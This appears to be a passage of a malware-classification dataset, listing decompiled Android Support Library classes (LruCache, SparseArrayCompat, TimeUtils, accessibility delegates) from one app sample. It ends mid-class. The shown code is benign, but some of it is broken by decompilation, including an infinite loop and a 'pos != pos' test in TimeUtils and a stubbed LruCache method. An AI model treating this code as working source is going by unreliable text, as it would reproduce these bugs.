"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.net\TrafficStatsCompatIcs.code","public class TrafficStatsCompatIcs {   public static void clearThreadStatsTag(){     TrafficStats.clearThreadStatsTag();   }   public static int getThreadStatsTag(){     return TrafficStats.getThreadStatsTag();   }   public static void incrementOperationCount(  int operationCount){     TrafficStats.incrementOperationCount(operationCount);   }   public static void incrementOperationCount(  int tag,  int operationCount){     TrafficStats.incrementOperationCount(tag,operationCount);   }   public static void setThreadStatsTag(  int tag){     TrafficStats.setThreadStatsTag(tag);   }   public static void tagSocket(  Socket socket) throws SocketException {     TrafficStats.tagSocket(socket);   }   public static void untagSocket(  Socket socket) throws SocketException {     TrafficStats.untagSocket(socket);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.net\TrafficStatsCompatImpl.code","interface TrafficStatsCompatImpl {   void clearThreadStatsTag();   int getThreadStatsTag();   void incrementOperationCount(  int i);   void incrementOperationCount(  int i,  int i2);   void setThreadStatsTag(  int i);   void tagSocket(  Socket socket) throws SocketException ;   void untagSocket(  Socket socket) throws SocketException ; } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.os\CompatCreator.code","static class CompatCreator<T> implements Parcelable.Creator<T> {   final ParcelableCompatCreatorCallbacks<T> mCallbacks;   public CompatCreator(  ParcelableCompatCreatorCallbacks<T> callbacks){     this.mCallbacks=callbacks;   }   @Override public T createFromParcel(  Parcel source){     return this.mCallbacks.createFromParcel(source,null);   }   @Override public T[] newArray(  int size){     return this.mCallbacks.newArray(size);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.os\ParcelableCompat.code","public class ParcelableCompat {   public static <T>Parcelable.Creator<T> newCreator(  ParcelableCompatCreatorCallbacks<T> callbacks){     if (Build.VERSION.SDK_INT >= 13) {       ParcelableCompatCreatorHoneycombMR2Stub.instantiate(callbacks);     }     return new CompatCreator(callbacks);   } static class CompatCreator<T> implements Parcelable.Creator<T> {     final ParcelableCompatCreatorCallbacks<T> mCallbacks;     public CompatCreator(    ParcelableCompatCreatorCallbacks<T> callbacks){       this.mCallbacks=callbacks;     }     @Override public T createFromParcel(    Parcel source){       return this.mCallbacks.createFromParcel(source,null);     }     @Override public T[] newArray(    int size){       return this.mCallbacks.newArray(size);     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.os\ParcelableCompatCreatorCallbacks.code","public interface ParcelableCompatCreatorCallbacks<T> {   T createFromParcel(  Parcel parcel,  ClassLoader classLoader);   T[] newArray(  int i); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.os\ParcelableCompatCreatorHoneycombMR2.code","class ParcelableCompatCreatorHoneycombMR2<T> implements Parcelable.ClassLoaderCreator<T> {   private final ParcelableCompatCreatorCallbacks<T> mCallbacks;   public ParcelableCompatCreatorHoneycombMR2(  ParcelableCompatCreatorCallbacks<T> callbacks){     this.mCallbacks=callbacks;   }   @Override public T createFromParcel(  Parcel in){     return this.mCallbacks.createFromParcel(in,null);   }   @Override public T createFromParcel(  Parcel in,  ClassLoader loader){     return this.mCallbacks.createFromParcel(in,loader);   }   @Override public T[] newArray(  int size){     return this.mCallbacks.newArray(size);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.os\ParcelableCompatCreatorHoneycombMR2Stub.code","class ParcelableCompatCreatorHoneycombMR2Stub {   ParcelableCompatCreatorHoneycombMR2Stub(){   }   public static <T>Parcelable.Creator<T> instantiate(  ParcelableCompatCreatorCallbacks<T> callbacks){     return new ParcelableCompatCreatorHoneycombMR2(callbacks);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.util\DebugUtils.code","public class DebugUtils {   public static void buildShortClassTag(  Object cls,  StringBuilder out){     int end;     if (cls == null) {       out.append(""null"");       return;     }     String simpleName=cls.getClass().getSimpleName();     if ((simpleName == null || simpleName.length() <= 0) && (end=(simpleName=cls.getClass().getName()).lastIndexOf(46)) > 0) {       simpleName=simpleName.substring(end + 1);     }     out.append(simpleName);     out.append('{');     out.append(Integer.toHexString(System.identityHashCode(cls)));   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.util\LogWriter.code","public class LogWriter extends Writer {   private StringBuilder mBuilder=new StringBuilder(128);   private final String mTag;   public LogWriter(  String tag){     this.mTag=tag;   }   @Override public void close(){     flushBuilder();   }   @Override public void flush(){     flushBuilder();   }   @Override public void write(  char[] buf,  int offset,  int count){     for (int i=0; i < count; i++) {       char c2=buf[offset + i];       if (c2 == '\n') {         flushBuilder();       }  else {         this.mBuilder.append(c2);       }     }   }   private void flushBuilder(){     if (this.mBuilder.length() > 0) {       Log.d(this.mTag,this.mBuilder.toString());       this.mBuilder.delete(0,this.mBuilder.length());     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.util\LongSparseArray.code","public class LongSparseArray<E> implements Cloneable {   private static final Object DELETED=new Object();   private boolean mGarbage;   private long[] mKeys;   private int mSize;   private Object[] mValues;   public LongSparseArray(){     this(10);   }   public LongSparseArray(  int initialCapacity){     this.mGarbage=false;     int initialCapacity2=idealLongArraySize(initialCapacity);     this.mKeys=new long[initialCapacity2];     this.mValues=new Object[initialCapacity2];     this.mSize=0;   }   public LongSparseArray<E> m0clone(){     LongSparseArray<E> clone=null;     try {       clone=(LongSparseArray)super.clone();       clone.mKeys=(long[])this.mKeys.clone();       clone.mValues=(Object[])this.mValues.clone();       return clone;     }  catch (    CloneNotSupportedException e) {       return clone;     }   }   public E get(  long key){     return get(key,null);   }   public E get(  long j,  E e){     int binarySearch=binarySearch(this.mKeys,0,this.mSize,j);     return (binarySearch < 0 || this.mValues[binarySearch] == DELETED) ? e : (E)this.mValues[binarySearch];   }   public void delete(  long key){     int i=binarySearch(this.mKeys,0,this.mSize,key);     if (i >= 0 && this.mValues[i] != DELETED) {       this.mValues[i]=DELETED;       this.mGarbage=true;     }   }   public void remove(  long key){     delete(key);   }   public void removeAt(  int index){     if (this.mValues[index] != DELETED) {       this.mValues[index]=DELETED;       this.mGarbage=true;     }   }   private void gc(){     int n=this.mSize;     int o=0;     long[] keys=this.mKeys;     Object[] values=this.mValues;     for (int i=0; i < n; i++) {       Object val=values[i];       if (val != DELETED) {         if (i != o) {           keys[o]=keys[i];           values[o]=val;           values[i]=null;         }         o++;       }     }     this.mGarbage=false;     this.mSize=o;   }   public void put(  long key,  E value){     int i=binarySearch(this.mKeys,0,this.mSize,key);     if (i >= 0) {       this.mValues[i]=value;       return;     }     int i2=i ^ (-1);     if (i2 < this.mSize && this.mValues[i2] == DELETED) {       this.mKeys[i2]=key;       this.mValues[i2]=value;       return;     }     if (this.mGarbage && this.mSize >= this.mKeys.length) {       gc();       i2=binarySearch(this.mKeys,0,this.mSize,key) ^ (-1);     }     if (this.mSize >= this.mKeys.length) {       int n=idealLongArraySize(this.mSize + 1);       long[] nkeys=new long[n];       Object[] nvalues=new Object[n];       System.arraycopy(this.mKeys,0,nkeys,0,this.mKeys.length);       System.arraycopy(this.mValues,0,nvalues,0,this.mValues.length);       this.mKeys=nkeys;       this.mValues=nvalues;     }     if (this.mSize - i2 != 0) {       System.arraycopy(this.mKeys,i2,this.mKeys,i2 + 1,this.mSize - i2);       System.arraycopy(this.mValues,i2,this.mValues,i2 + 1,this.mSize - i2);     }     this.mKeys[i2]=key;     this.mValues[i2]=value;     this.mSize++;   }   public int size(){     if (this.mGarbage) {       gc();     }     return this.mSize;   }   public long keyAt(  int index){     if (this.mGarbage) {       gc();     }     return this.mKeys[index];   }   public E valueAt(  int i){     if (this.mGarbage) {       gc();     }     return (E)this.mValues[i];   }   public void setValueAt(  int index,  E value){     if (this.mGarbage) {       gc();     }     this.mValues[index]=value;   }   public int indexOfKey(  long key){     if (this.mGarbage) {       gc();     }     return binarySearch(this.mKeys,0,this.mSize,key);   }   public int indexOfValue(  E value){     if (this.mGarbage) {       gc();     }     for (int i=0; i < this.mSize; i++) {       if (this.mValues[i] == value) {         return i;       }     }     return -1;   }   public void clear(){     int n=this.mSize;     Object[] values=this.mValues;     for (int i=0; i < n; i++) {       values[i]=null;     }     this.mSize=0;     this.mGarbage=false;   }   public void append(  long key,  E value){     if (this.mSize != 0 && key <= this.mKeys[this.mSize - 1]) {       put(key,value);       return;     }     if (this.mGarbage && this.mSize >= this.mKeys.length) {       gc();     }     int pos=this.mSize;     if (pos >= this.mKeys.length) {       int n=idealLongArraySize(pos + 1);       long[] nkeys=new long[n];       Object[] nvalues=new Object[n];       System.arraycopy(this.mKeys,0,nkeys,0,this.mKeys.length);       System.arraycopy(this.mValues,0,nvalues,0,this.mValues.length);       this.mKeys=nkeys;       this.mValues=nvalues;     }     this.mKeys[pos]=key;     this.mValues[pos]=value;     this.mSize=pos + 1;   }   private static int binarySearch(  long[] a,  int start,  int len,  long key){     int high=start + len;     int low=start - 1;     while (high - low > 1) {       int guess=(high + low) / 2;       if (a[guess] < key) {         low=guess;       }  else {         high=guess;       }     }     if (high != start + len) {       return a[high] != key ? high ^ (-1) : high;     }     int high2=(start + len) ^ (-1);     return high2;   }   public static int idealByteArraySize(  int need){     for (int i=4; i < 32; i++) {       if (need <= (1 << i) - 12) {         return (1 << i) - 12;       }     }     return need;   }   public static int idealLongArraySize(  int need){     return idealByteArraySize(need * 8) / 8;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.util\LruCache.code","public class LruCache<K,V> {   private int createCount;   private int evictionCount;   private int hitCount;   private final LinkedHashMap<K,V> map;   private int maxSize;   private int missCount;   private int putCount;   private int size;   public LruCache(  int maxSize){     if (maxSize <= 0) {       throw new IllegalArgumentException(""maxSize <= 0"");     }     this.maxSize=maxSize;     this.map=new LinkedHashMap<>(0,0.75f,true);   }   public final V get(  K k){     V v;     if (k == null) {       throw new NullPointerException(""key == null"");     } synchronized (this) {       V v2=this.map.get(k);       if (v2 != null) {         this.hitCount++;         return v2;       }       this.missCount++;       V create=create(k);       if (create == null) {         return null;       } synchronized (this) {         this.createCount++;         v=(V)this.map.put(k,create);         if (v != null) {           this.map.put(k,v);         }  else {           this.size+=safeSizeOf(k,create);         }       }       if (v != null) {         entryRemoved(false,k,create,v);         return v;       }       trimToSize(this.maxSize);       return create;     }   }   public final V put(  K key,  V value){     V previous;     if (key == null || value == null) {       throw new NullPointerException(""key == null || value == null"");     } synchronized (this) {       this.putCount++;       this.size+=safeSizeOf(key,value);       previous=this.map.put(key,value);       if (previous != null) {         this.size-=safeSizeOf(key,previous);       }     }     if (previous != null) {       entryRemoved(false,key,previous,value);     }     trimToSize(this.maxSize);     return previous;   }   private void trimToSize(  int r7){     throw new UnsupportedOperationException(""Method not decompiled: android.support.v4.util.LruCache.trimToSize(int):void"");   }   public final V remove(  K key){     V previous;     if (key == null) {       throw new NullPointerException(""key == null"");     } synchronized (this) {       previous=this.map.remove(key);       if (previous != null) {         this.size-=safeSizeOf(key,previous);       }     }     if (previous != null) {       entryRemoved(false,key,previous,null);     }     return previous;   }   protected void entryRemoved(  boolean evicted,  K key,  V oldValue,  V newValue){   }   protected V create(  K key){     return null;   }   private int safeSizeOf(  K key,  V value){     int result=sizeOf(key,value);     if (result < 0) {       throw new IllegalStateException(""Negative size: "" + key + ""=""+ value);     }     return result;   }   protected int sizeOf(  K key,  V value){     return 1;   }   public final void evictAll(){     trimToSize(-1);   }   public final synchronized int size(){     return this.size;   }   public final synchronized int maxSize(){     return this.maxSize;   }   public final synchronized int hitCount(){     return this.hitCount;   }   public final synchronized int missCount(){     return this.missCount;   }   public final synchronized int createCount(){     return this.createCount;   }   public final synchronized int putCount(){     return this.putCount;   }   public final synchronized int evictionCount(){     return this.evictionCount;   }   public final synchronized Map<K,V> snapshot(){     return new LinkedHashMap(this.map);   }   public final synchronized String toString(){     String format; synchronized (this) {       int accesses=this.hitCount + this.missCount;       int hitPercent=accesses != 0 ? (this.hitCount * 100) / accesses : 0;       format=String.format(""LruCache[maxSize=%d,hits=%d,misses=%d,hitRate=%d%%]"",Integer.valueOf(this.maxSize),Integer.valueOf(this.hitCount),Integer.valueOf(this.missCount),Integer.valueOf(hitPercent));     }     return format;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.util\SparseArrayCompat.code","public class SparseArrayCompat<E> {   private static final Object DELETED=new Object();   private boolean mGarbage;   private int[] mKeys;   private int mSize;   private Object[] mValues;   public SparseArrayCompat(){     this(10);   }   public SparseArrayCompat(  int initialCapacity){     this.mGarbage=false;     int initialCapacity2=idealIntArraySize(initialCapacity);     this.mKeys=new int[initialCapacity2];     this.mValues=new Object[initialCapacity2];     this.mSize=0;   }   public E get(  int key){     return get(key,null);   }   public E get(  int i,  E e){     int binarySearch=binarySearch(this.mKeys,0,this.mSize,i);     return (binarySearch < 0 || this.mValues[binarySearch] == DELETED) ? e : (E)this.mValues[binarySearch];   }   public void delete(  int key){     int i=binarySearch(this.mKeys,0,this.mSize,key);     if (i >= 0 && this.mValues[i] != DELETED) {       this.mValues[i]=DELETED;       this.mGarbage=true;     }   }   public void remove(  int key){     delete(key);   }   public void removeAt(  int index){     if (this.mValues[index] != DELETED) {       this.mValues[index]=DELETED;       this.mGarbage=true;     }   }   public void removeAtRange(  int index,  int size){     int end=Math.min(this.mSize,index + size);     for (int i=index; i < end; i++) {       removeAt(i);     }   }   private void gc(){     int n=this.mSize;     int o=0;     int[] keys=this.mKeys;     Object[] values=this.mValues;     for (int i=0; i < n; i++) {       Object val=values[i];       if (val != DELETED) {         if (i != o) {           keys[o]=keys[i];           values[o]=val;         }         o++;       }     }     this.mGarbage=false;     this.mSize=o;   }   public void put(  int key,  E value){     int i=binarySearch(this.mKeys,0,this.mSize,key);     if (i >= 0) {       this.mValues[i]=value;       return;     }     int i2=i ^ (-1);     if (i2 < this.mSize && this.mValues[i2] == DELETED) {       this.mKeys[i2]=key;       this.mValues[i2]=value;       return;     }     if (this.mGarbage && this.mSize >= this.mKeys.length) {       gc();       i2=binarySearch(this.mKeys,0,this.mSize,key) ^ (-1);     }     if (this.mSize >= this.mKeys.length) {       int n=idealIntArraySize(this.mSize + 1);       int[] nkeys=new int[n];       Object[] nvalues=new Object[n];       System.arraycopy(this.mKeys,0,nkeys,0,this.mKeys.length);       System.arraycopy(this.mValues,0,nvalues,0,this.mValues.length);       this.mKeys=nkeys;       this.mValues=nvalues;     }     if (this.mSize - i2 != 0) {       System.arraycopy(this.mKeys,i2,this.mKeys,i2 + 1,this.mSize - i2);       System.arraycopy(this.mValues,i2,this.mValues,i2 + 1,this.mSize - i2);     }     this.mKeys[i2]=key;     this.mValues[i2]=value;     this.mSize++;   }   public int size(){     if (this.mGarbage) {       gc();     }     return this.mSize;   }   public int keyAt(  int index){     if (this.mGarbage) {       gc();     }     return this.mKeys[index];   }   public E valueAt(  int i){     if (this.mGarbage) {       gc();     }     return (E)this.mValues[i];   }   public void setValueAt(  int index,  E value){     if (this.mGarbage) {       gc();     }     this.mValues[index]=value;   }   public int indexOfKey(  int key){     if (this.mGarbage) {       gc();     }     return binarySearch(this.mKeys,0,this.mSize,key);   }   public int indexOfValue(  E value){     if (this.mGarbage) {       gc();     }     for (int i=0; i < this.mSize; i++) {       if (this.mValues[i] == value) {         return i;       }     }     return -1;   }   public void clear(){     int n=this.mSize;     Object[] values=this.mValues;     for (int i=0; i < n; i++) {       values[i]=null;     }     this.mSize=0;     this.mGarbage=false;   }   public void append(  int key,  E value){     if (this.mSize != 0 && key <= this.mKeys[this.mSize - 1]) {       put(key,value);       return;     }     if (this.mGarbage && this.mSize >= this.mKeys.length) {       gc();     }     int pos=this.mSize;     if (pos >= this.mKeys.length) {       int n=idealIntArraySize(pos + 1);       int[] nkeys=new int[n];       Object[] nvalues=new Object[n];       System.arraycopy(this.mKeys,0,nkeys,0,this.mKeys.length);       System.arraycopy(this.mValues,0,nvalues,0,this.mValues.length);       this.mKeys=nkeys;       this.mValues=nvalues;     }     this.mKeys[pos]=key;     this.mValues[pos]=value;     this.mSize=pos + 1;   }   private static int binarySearch(  int[] a,  int start,  int len,  int key){     int high=start + len;     int low=start - 1;     while (high - low > 1) {       int guess=(high + low) / 2;       if (a[guess] < key) {         low=guess;       }  else {         high=guess;       }     }     if (high != start + len) {       return a[high] != key ? high ^ (-1) : high;     }     int high2=(start + len) ^ (-1);     return high2;   }   static int idealByteArraySize(  int need){     for (int i=4; i < 32; i++) {       if (need <= (1 << i) - 12) {         return (1 << i) - 12;       }     }     return need;   }   static int idealIntArraySize(  int need){     return idealByteArraySize(need * 4) / 4;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.util\TimeUtils.code","public class TimeUtils {   public static final int HUNDRED_DAY_FIELD_LEN=19;   private static final int SECONDS_PER_DAY=86400;   private static final int SECONDS_PER_HOUR=3600;   private static final int SECONDS_PER_MINUTE=60;   private static final Object sFormatSync=new Object();   private static char[] sFormatStr=new char[24];   private static int accumField(  int amt,  int suffix,  boolean always,  int zeropad){     if (amt > 99 || (always && zeropad >= 3)) {       return suffix + 3;     }     if (amt > 9 || (always && zeropad >= 2)) {       return suffix + 2;     }     if (always || amt > 0) {       return suffix + 1;     }     return 0;   }   private static int printField(  char[] formatStr,  int amt,  char suffix,  int pos,  boolean always,  int zeropad){     if (always || amt > 0) {       if ((always && zeropad >= 3) || amt > 99) {         int dig=amt / 100;         formatStr[pos]=(char)(dig + 48);         pos++;         amt-=dig * 100;       }       if ((always && zeropad >= 2) || amt > 9 || pos != pos) {         int dig2=amt / 10;         formatStr[pos]=(char)(dig2 + 48);         pos++;         amt-=dig2 * 10;       }       formatStr[pos]=(char)(amt + 48);       int pos2=pos + 1;       formatStr[pos2]=suffix;       return pos2 + 1;     }     return pos;   }   private static int formatDurationLocked(  long duration,  int fieldLen){     char prefix;     if (sFormatStr.length < fieldLen) {       sFormatStr=new char[fieldLen];     }     char[] formatStr=sFormatStr;     if (duration == 0) {       int fieldLen2=fieldLen - 1;       while (0 < fieldLen2) {         formatStr[0]=' ';       }       formatStr[0]='0';       return 1;     }     if (duration > 0) {       prefix='+';     }  else {       prefix='-';       duration=-duration;     }     int millis=(int)(duration % 1000);     int seconds=(int)Math.floor(duration / 1000);     int days=0;     int hours=0;     int minutes=0;     if (seconds > SECONDS_PER_DAY) {       days=seconds / SECONDS_PER_DAY;       seconds-=SECONDS_PER_DAY * days;     }     if (seconds > SECONDS_PER_HOUR) {       hours=seconds / SECONDS_PER_HOUR;       seconds-=hours * SECONDS_PER_HOUR;     }     if (seconds > SECONDS_PER_MINUTE) {       minutes=seconds / SECONDS_PER_MINUTE;       seconds-=minutes * SECONDS_PER_MINUTE;     }     int pos=0;     if (fieldLen != 0) {       int myLen=accumField(days,1,false,0);       int myLen2=myLen + accumField(hours,1,myLen > 0,2);       int myLen3=myLen2 + accumField(minutes,1,myLen2 > 0,2);       int myLen4=myLen3 + accumField(seconds,1,myLen3 > 0,2);       for (int myLen5=myLen4 + accumField(millis,2,true,myLen4 > 0 ? 3 : 0) + 1; myLen5 < fieldLen; myLen5++) {         formatStr[pos]=' ';         pos++;       }     }     formatStr[pos]=prefix;     int pos2=pos + 1;     boolean zeropad=fieldLen != 0;     int pos3=printField(formatStr,days,'d',pos2,false,0);     int pos4=printField(formatStr,hours,'h',pos3,pos3 != pos2,zeropad ? 2 : 0);     int pos5=printField(formatStr,minutes,'m',pos4,pos4 != pos2,zeropad ? 2 : 0);     int pos6=printField(formatStr,seconds,'s',pos5,pos5 != pos2,zeropad ? 2 : 0);     int pos7=printField(formatStr,millis,'m',pos6,true,(!zeropad || pos6 == pos2) ? 0 : 3);     formatStr[pos7]='s';     return pos7 + 1;   }   public static void formatDuration(  long duration,  StringBuilder builder){ synchronized (sFormatSync) {       int len=formatDurationLocked(duration,0);       builder.append(sFormatStr,0,len);     }   }   public static void formatDuration(  long duration,  PrintWriter pw,  int fieldLen){ synchronized (sFormatSync) {       int len=formatDurationLocked(duration,fieldLen);       pw.print(new String(sFormatStr,0,len));     }   }   public static void formatDuration(  long duration,  PrintWriter pw){     formatDuration(duration,pw,0);   }   public static void formatDuration(  long time,  long now,  PrintWriter pw){     if (time == 0) {       pw.print(""--"");     }  else {       formatDuration(time - now,pw,0);     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\AccessibilityDelegateBridge.code","public interface AccessibilityDelegateBridge {   boolean dispatchPopulateAccessibilityEvent(  View view,  AccessibilityEvent accessibilityEvent);   void onInitializeAccessibilityEvent(  View view,  AccessibilityEvent accessibilityEvent);   void onInitializeAccessibilityNodeInfo(  View view,  Object obj);   void onPopulateAccessibilityEvent(  View view,  AccessibilityEvent accessibilityEvent);   boolean onRequestSendAccessibilityEvent(  ViewGroup viewGroup,  View view,  AccessibilityEvent accessibilityEvent);   void sendAccessibilityEvent(  View view,  int i);   void sendAccessibilityEventUnchecked(  View view,  AccessibilityEvent accessibilityEvent); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\AccessibilityDelegateBridgeJellyBean.code","public interface AccessibilityDelegateBridgeJellyBean {   boolean dispatchPopulateAccessibilityEvent(  View view,  AccessibilityEvent accessibilityEvent);   Object getAccessibilityNodeProvider(  View view);   void onInitializeAccessibilityEvent(  View view,  AccessibilityEvent accessibilityEvent);   void onInitializeAccessibilityNodeInfo(  View view,  Object obj);   void onPopulateAccessibilityEvent(  View view,  AccessibilityEvent accessibilityEvent);   boolean onRequestSendAccessibilityEvent(  ViewGroup viewGroup,  View view,  AccessibilityEvent accessibilityEvent);   boolean performAccessibilityAction(  View view,  int i,  Bundle bundle);   void sendAccessibilityEvent(  View view,  int i);   void sendAccessibilityEventUnchecked(  View view,  AccessibilityEvent accessibilityEvent); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\AccessibilityDelegateCompat.code","public class AccessibilityDelegateCompat {   private static final Object DEFAULT_DELEGATE;   private static final AccessibilityDelegateImpl IMPL;   final Object mBridge=IMPL.newAccessiblityDelegateBridge(this); public interface AccessibilityDelegateImpl {     boolean dispatchPopulateAccessibilityEvent(    Object obj,    View view,    AccessibilityEvent accessibilityEvent);     AccessibilityNodeProviderCompat getAccessibilityNodeProvider(    Object obj,    View view);     Object newAccessiblityDelegateBridge(    AccessibilityDelegateCompat accessibilityDelegateCompat);     Object newAccessiblityDelegateDefaultImpl();     void onInitializeAccessibilityEvent(    Object obj,    View view,    AccessibilityEvent accessibilityEvent);     void onInitializeAccessibilityNodeInfo(    Object obj,    View view,    AccessibilityNodeInfoCompat accessibilityNodeInfoCompat);     void onPopulateAccessibilityEvent(    Object obj,    View view,    AccessibilityEvent accessibilityEvent);     boolean onRequestSendAccessibilityEvent(    Object obj,    ViewGroup viewGroup,    View view,    AccessibilityEvent accessibilityEvent);     boolean performAccessibilityAction(    Object obj,    View view,    int i,    Bundle bundle);     void sendAccessibilityEvent(    Object obj,    View view,    int i);     void sendAccessibilityEventUnchecked(    Object obj,    View view,    AccessibilityEvent accessibilityEvent);   } static class AccessibilityDelegateStubImpl implements AccessibilityDelegateImpl {     AccessibilityDelegateStubImpl(){     }     @Override public Object newAccessiblityDelegateDefaultImpl(){       return null;     }     @Override public Object newAccessiblityDelegateBridge(    AccessibilityDelegateCompat listener){       return null;     }     @Override public boolean dispatchPopulateAccessibilityEvent(    Object delegate,    View host,    AccessibilityEvent event){       return false;     }     @Override public void onInitializeAccessibilityEvent(    Object delegate,    View host,    AccessibilityEvent event){     }     @Override public void onInitializeAccessibilityNodeInfo(    Object delegate,    View host,    AccessibilityNodeInfoCompat info){     }     @Override public void onPopulateAccessibilityEvent(    Object delegate,    View host,    AccessibilityEvent event){     }     @Override public boolean onRequestSendAccessibilityEvent(    Object delegate,    ViewGroup host,    View child,    AccessibilityEvent event){       return true;     }     @Override public void sendAccessibilityEvent(    Object delegate,    View host,    int eventType){     }     @Override public void sendAccessibilityEventUnchecked(    Object delegate,    View host,    AccessibilityEvent event){     }     @Override public AccessibilityNodeProviderCompat getAccessibilityNodeProvider(    Object delegate,    View host){       return null;     }     @Override public boolean performAccessibilityAction(    Object delegate,    View host,    int action,    Bundle args){       return false;     }   } static class AccessibilityDelegateIcsImpl extends AccessibilityDelegateStubImpl {     AccessibilityDelegateIcsImpl(){     }     @Override public Object newAccessiblityDelegateDefaultImpl(){       return AccessibilityDelegateCompatIcs.newAccessibilityDelegateDefaultImpl();     }     @Override public Object newAccessiblityDelegateBridge(    final AccessibilityDelegateCompat compat){       return AccessibilityDelegateCompatIcs.newAccessibilityDelegateBridge(new AccessibilityDelegateCompatIcs.AccessibilityDelegateBridge(){         @Override public boolean dispatchPopulateAccessibilityEvent(        View host,        AccessibilityEvent event){           return compat.dispatchPopulateAccessibilityEvent(host,event);         }         @Override public void onInitializeAccessibilityEvent(        View host,        AccessibilityEvent event){           compat.onInitializeAccessibilityEvent(host,event);         }         @Override public void onInitializeAccessibilityNodeInfo(        View host,        Object info){           compat.onInitializeAccessibilityNodeInfo(host,new AccessibilityNodeInfoCompat(info));         }         @Override public void onPopulateAccessibilityEvent(        View host,        AccessibilityEvent event){           compat.onPopulateAccessibilityEvent(host,event);         }         @Override public boolean onRequestSendAccessibilityEvent(        ViewGroup host,        View child,        AccessibilityEvent event){           return compat.onRequestSendAccessibilityEvent(host,child,event);         }         @Override public void sendAccessibilityEvent(        View host,        int eventType){           compat.sendAccessibilityEvent(host,eventType);         }         @Override public void sendAccessibilityEventUnchecked(        View host,        AccessibilityEvent event){           compat.sendAccessibilityEventUnchecked(host,event);         }       } );     }     @Override public boolean dispatchPopulateAccessibilityEvent(    Object delegate,    View host,    AccessibilityEvent event){       return AccessibilityDelegateCompatIcs.dispatchPopulateAccessibilityEvent(delegate,host,event);     }     @Override public void onInitializeAccessibilityEvent(    Object delegate,    View host,    AccessibilityEvent event){       AccessibilityDelegateCompatIcs.onInitializeAccessibilityEvent(delegate,host,event);     }     @Override public void onInitializeAccessibilityNodeInfo(    Object delegate,    View host,    AccessibilityNodeInfoCompat info){       AccessibilityDelegateCompatIcs.onInitializeAccessibilityNodeInfo(delegate,host,info.getInfo());     }     @Override public void onPopulateAccessibilityEvent(    Object delegate,    View host,    AccessibilityEvent event){       AccessibilityDelegateCompatIcs.onPopulateAccessibilityEvent(delegate,host,event);     }     @Override public boolean onRequestSendAccessibilityEvent(    Object delegate,    ViewGroup host,    View child,    AccessibilityEvent event){       return AccessibilityDelegateCompatIcs.onRequestSendAccessibilityEvent(delegate,host,child,event);     }     @Override public void sendAccessibilityEvent(    Object delegate,    View host,    int eventType){       AccessibilityDelegateCompatIcs.sendAccessibilityEvent(delegate,host,eventType);     }     @Override public void sendAccessibilityEventUnchecked(    Object delegate,    View host,    AccessibilityEvent event){       AccessibilityDelegateCompatIcs.sendAccessibilityEventUnchecked(delegate,host,event);     }   } static class AccessibilityDelegateJellyBeanImpl extends AccessibilityDelegateIcsImpl {     AccessibilityDelegateJellyBeanImpl(){     }     @Override public Object newAccessiblityDelegateBridge(    final AccessibilityDelegateCompat compat){       return AccessibilityDelegateCompatJellyBean.newAccessibilityDelegateBridge(new AccessibilityDelegateCompatJellyBean.AccessibilityDelegateBridgeJellyBean(){         @Override public boolean dispatchPopulateAccessibilityEvent(        View host,        AccessibilityEvent event){           return compat.dispatchPopulateAccessibilityEvent(host,event);         }         @Override public void onInitializeAccessibilityEvent(        View host,        AccessibilityEvent event){           compat.onInitializeAccessibilityEvent(host,event);         }         @Override public void onInitializeAccessibilityNodeInfo(        View host,        Object info){           compat.onInitializeAccessibilityNodeInfo(host,new AccessibilityNodeInfoCompat(info));         }         @Override public void onPopulateAccessibilityEvent(        View host,        AccessibilityEvent event){           compat.onPopulateAccessibilityEvent(host,event);         }         @Override public boolean onRequestSendAccessibilityEvent(        ViewGroup host,        View child,        AccessibilityEvent event){           return compat.onRequestSendAccessibilityEvent(host,child,event);         }         @Override public void sendAccessibilityEvent(        View host,        int eventType){           compat.sendAccessibilityEvent(host,eventType);         }         @Override public void sendAccessibilityEventUnchecked(        View host,        AccessibilityEvent event){           compat.sendAccessibilityEventUnchecked(host,event);         }         @Override public Object getAccessibilityNodeProvider(        View host){           AccessibilityNodeProviderCompat provider=compat.getAccessibilityNodeProvider(host);           if (provider != null) {             return provider.getProvider();           }           return null;         }         @Override public boolean performAccessibilityAction(        View host,        int action,        Bundle args){           return compat.performAccessibilityAction(host,action,args);         }       } );     }     @Override public AccessibilityNodeProviderCompat getAccessibilityNodeProvider(    Object delegate,    View host){       Object 